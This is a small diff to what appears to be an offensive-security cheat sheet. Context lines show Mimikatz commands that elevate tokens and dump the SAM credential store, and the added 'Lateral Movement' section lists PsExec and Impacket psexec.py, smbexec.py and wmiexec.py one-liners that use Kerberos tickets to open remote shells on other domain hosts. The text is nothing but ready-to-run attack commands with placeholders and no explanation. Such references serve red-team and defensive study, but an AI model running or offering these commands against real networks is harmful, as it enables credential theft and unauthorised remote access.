@@ -91,4 +91,12 @@ mimikatz # kerberos::list
 
 Invoke Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
 
+# Lateral Movement
+```PsExec.exe -accepteula \\$HOSTNAME cmd```
+
+```psexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
+
+```smbexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
+
+```wmiexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
 
